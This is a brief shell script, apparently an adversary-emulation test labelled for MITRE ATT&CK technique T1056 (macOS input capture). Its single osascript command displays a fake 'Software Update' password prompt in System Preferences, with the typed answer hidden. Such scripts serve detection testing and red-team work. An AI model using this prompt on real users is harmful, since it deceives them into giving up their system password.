#!/usr/bin/env sh
# ATTACK_EXECUTION_T1056_MACOS_INPUT_CAPTURE
osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon 1 with hidden answer with title "Software Update"'
